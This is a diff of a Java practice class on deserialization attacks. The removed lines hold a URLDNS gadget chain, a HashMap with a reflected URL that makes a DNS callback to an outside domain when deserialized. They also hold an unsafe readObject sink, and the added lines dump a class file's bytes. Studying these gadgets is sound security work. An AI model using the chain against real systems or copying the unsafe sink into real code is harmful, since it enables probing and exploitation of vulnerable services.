@@ -11,19 +11,8 @@ public class TestClass {
         objectOutputStream.writeObject(object);
         System.out.println("serialization方法成功执行");
     }
-    public static String serialize(String data) {
-        try {
-            byte[] payload = Base64.getDecoder().decode(data);
-            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payload);
-            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
-            objectInputStream.readObject();
-            return "success";
-        } catch (Exception var5) {
-            return var5.getMessage();
-        }
-    }
 
-    public static String serializeAndPrintBase64(Object object) throws Exception {
+    public static void serializeAndPrintBase64(Object object) throws Exception {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
         objectOutputStream.writeObject(object);
@@ -35,9 +24,7 @@ public class TestClass {
         String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);
 //        String payload = Arrays.toString(Base64.getDecoder().decode(base64Encoded));
 //        System.out.println(payload);
-        System.out.println("Serialized and Base64 encoded object: " + base64Encoded);
-        return base64Encoded;
-
+        System.out.println(base64Encoded);
     }
 
 
@@ -49,21 +36,18 @@ public class TestClass {
     }
 
     public static void main(String[] args) throws Exception{
-        HashMap hashMap = new HashMap();
-        URL url = new URL("http://lyvjkhojjz.dgrh3.cn");
+        String filePath = "E:\\study_java\\target\\classes\\B.class";
 
-        /********反射*******/
-        //将hashCode的值不改为*1
-        Class c = url.getClass();
-//        System.out.println(c);
-        Field hashcodefield = c.getDeclaredField("hashCode");
-        hashcodefield.setAccessible(true);
-        hashcodefield.set(url,1234);//设置hashCode值为1234
+        try (FileInputStream fis = new FileInputStream(filePath)) {
+            byte[] data = new byte[fis.available()]; // 创建一个字节数组，大小等于文件大小
+            fis.read(data); // 读取文件内容到字节数组
 
-        hashMap.put(url,1);
-        hashcodefield.set(url,-1);//设置hashCode值为-1
-//        serialization(hashMap);
-        serialize(serializeAndPrintBase64(hashMap));
-//        unserialization();
+            // 打印字节数据
+            for (byte b : data) {
+                System.out.print(b + ",");
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 }
